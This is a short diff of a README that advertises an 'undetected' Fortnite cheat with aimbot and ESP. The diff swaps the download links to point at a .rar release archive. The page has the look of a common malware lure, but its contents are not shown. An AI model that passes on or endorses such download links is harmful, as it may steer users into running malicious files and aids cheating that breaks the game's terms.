@@ -1,5 +1,6 @@
 <div align="center">
-  Fortnite External
+  
+  [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
   
@@ -22,9 +23,9 @@
 ---
 
 
-### ⬇️ Download
+### [⬇️ Download](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TeamHelpFortress/wardogs-cheats/releases/download/v1.0.0/wardogs.cheats.zip).
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/Fortnite/fortnite.1.5.rar).
 
 
 </div>
